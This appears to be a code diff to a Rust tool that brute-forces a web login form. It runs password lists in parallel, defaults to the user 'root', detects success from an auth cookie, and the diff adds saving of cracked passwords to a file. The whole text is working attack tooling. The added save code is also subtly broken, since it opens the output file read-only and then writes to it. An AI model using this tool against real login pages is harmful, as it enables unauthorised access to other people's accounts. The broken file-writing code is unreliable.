@@ -1,4 +1,4 @@
-use std::{path::PathBuf, fs::File, sync::{Arc, RwLock}, io::{BufReader, BufRead}};
+use std::{path::{PathBuf, Path}, fs::File, sync::{Arc, RwLock}, io::{BufReader, BufRead, Write}};
 
 use clap::Parser;
 use lazy_static::lazy_static;
@@ -43,7 +43,12 @@ struct Args {
     /// the user to bruteforce against
     #[clap(short, long)]
     #[clap(default_value = "root")]
-    user: String
+    user: String,
+
+    /// save the output to a file
+    #[clap(short, long)]   
+    #[clap(default_value = "result.txt")]
+    output: PathBuf
 }
 
 #[derive(Debug, Clone, Serialize)]
@@ -81,15 +86,18 @@ fn pluck_token_value_from_html(html: &str) -> Result<&str> {
     )
 }
 
-fn on_success(user: &str, pass: &str) {
+fn on_success(user: &str, pass: &str, output_filepath: &Path) {
     println!("[HIT] user={:?}, pass={:?} thread={}", user, pass, rayon::current_thread_index().unwrap());
+
+    let mut output_file = File::open(output_filepath).unwrap();
+    output_file.write(pass.as_bytes()).context("failed to write to output file").unwrap();
 }
 
 fn on_failure(user: &str, pass: &str) {
     println!("[FAIL] user={:?}, pass={:?} thread={}", user, pass, rayon::current_thread_index().unwrap());
 }
 
-fn attempt_login(url: &str, user: &str, pass: String, req_client: &reqwest::blocking::Client) -> bool {
+fn attempt_login(url: &str, user: &str, output_file: &Path, pass: String, req_client: &reqwest::blocking::Client) -> bool {
     // Make an initial GET request and collect session data
     let get_resp = req_client.get(&*url)
         .send()
@@ -120,7 +128,7 @@ fn attempt_login(url: &str, user: &str, pass: String, req_client: &reqwest::bloc
     // let cookies: Vec<_> = (&post_resp).cookies().collect();
     for cookie in (&post_resp).cookies() {
         if cookie.name().contains(MAGIC_AUTH_STRING) {
-            on_success(user, &pass);
+            on_success(user, &pass, output_file);
 
             return true;
         }
@@ -148,6 +156,7 @@ fn main() -> Result<()> {
     let url = Arc::new(args.url);
     let user = Arc::new(args.user);
     let delay = Arc::new(args.delay);
+    let output_file = Arc::new(args.output);
 
     let req_client = reqwest::blocking::ClientBuilder::new()
         .cookie_store(true)
@@ -160,12 +169,14 @@ fn main() -> Result<()> {
             let user_cloned = user.clone();
             let req_client_cloned = req_client.clone();
             let delay_cloned = delay.clone();
+            let output_file = output_file.clone();
             let is_finished_cloned = is_finished.clone();
 
             s.spawn_fifo(move |_| {
                 match attempt_login(
                     &url_cloned,
                     &user_cloned,
+                    &output_file,
                     line.context("failed to read line").unwrap(),
                     &req_client_cloned
                 ) {
